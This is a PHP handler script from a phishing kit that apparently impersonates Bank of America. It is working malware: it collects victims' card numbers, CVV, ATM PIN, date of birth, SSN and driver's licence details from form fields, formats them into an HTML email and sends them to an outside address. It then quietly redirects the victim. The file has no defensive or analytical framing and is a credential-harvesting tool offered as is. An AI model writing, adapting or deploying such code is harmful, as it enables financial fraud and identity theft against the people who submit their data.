<?php
error_reporting(0);
session_start();


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;


$_SESSION['cardholdername'] = $_GET['1'];
$_SESSION['cardNumber'] = $_GET['2'];
$_SESSION['edmonth'] = $_GET['Combobox1'];
$_SESSION['edyear'] = $_GET['Combobox2'];
$_SESSION['cvn'] = $_GET['3'];
$_SESSION['pin'] = $_GET['4'];
$_SESSION['D'] = $_GET['Combobox3'];
$_SESSION['m'] = $_GET['Combobox4'];
$_SESSION['y'] = $_GET['Combobox5'];
$_SESSION['SSN'] = $_GET['5'];
$_SESSION['DLN'] = $_GET['6'];
$_SESSION['DLexpm'] = $_GET['Combobox6'];
$_SESSION['DLexpy'] = $_GET['Combobox7'];


$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
Card Holder:  =>   <font color='#F31414'>".$_GET['1']."</font><br />
card number :  =>   <font color='#F31414'>".$_GET['2']."</font><br />
Exp Date :  =>   <font color='#F31414'>".$_GET['Combobox1']."-".$_GET['Combobox2']."</font><br />
CCV    =>   <font color='#F31414'>".$_GET['3']."</font><br />
Pin ATM:  =>   <font color='#F31414'>".$_GET['4']."</font><br />
DOB :  =>   <font color='#F31414'>".$_GET['Combobox3']."-".$_GET['Combobox4']."-".$_GET['Combobox5']."</font><br />
SSN   =>   <font color='#F31414'>".$_GET['5']."</font><br />
Drive Licence Number:  =>   <font color='#F31414'>".$_GET['6']."</font><br />
Driving Licence Exp Date :  =>   <font color='#F31414'>".$_GET['Combobox6']."-".$_GET['Combobox7']."</font><br />
___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$subject  = " BOA :  vbv / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-OPA" . "\r\n";
$to = "jerryman@post.com";
@mail($to,$subject,$message,$headers);

 
 header("location:../fin.php");
        
		  
		  ?>